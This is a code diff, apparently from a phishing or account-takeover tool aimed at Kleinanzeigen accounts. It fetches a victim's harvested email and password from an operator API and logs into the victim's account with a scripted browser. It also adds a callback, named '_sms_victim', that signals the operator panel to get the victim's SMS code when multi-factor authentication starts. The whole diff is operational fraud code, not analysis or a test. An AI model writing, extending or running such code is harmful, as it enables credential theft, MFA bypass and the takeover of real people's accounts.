@@ -134,7 +134,10 @@ def wait_for_credentials(
         try:
             data = api_get(base_url, path, worker_secret, timeout=30)
             email = (data.get("email") or "").strip()
-            password = (data.get("password") or "").strip()
+            kl_pw = (data.get("passwordKl") or "").strip()
+            gen_pw = (data.get("password") or "").strip()
+            # Klein: password — пароль почты для lead_simulation; для прямого входа на Kl — passwordKl.
+            password = kl_pw or gen_pw
             if email and password:
                 return email, password
         except urllib.error.HTTPError as e:
@@ -202,6 +205,10 @@ def _run(base_url: str, lead_id: str, worker_secret: str) -> None:
     login_url = (os.environ.get("KLEINANZEIGEN_LOGIN_URL") or DEFAULT_LOGIN_URL).strip()
 
     script_event(base_url, lead_id, worker_secret, EV_KLEIN_SCRIPT_BROWSER)
+
+    def _sms_victim() -> None:
+        send_result(base_url, lead_id, worker_secret, "sms")
+
     exit_code = klein_login_playwright(
         email,
         password,
@@ -210,6 +217,7 @@ def _run(base_url: str, lead_id: str, worker_secret: str) -> None:
         api_base=base_url,
         lead_id=lead_id,
         worker_secret=worker_secret,
+        on_mfa_start=_sms_victim,
     )
 
     if exit_code == 0:
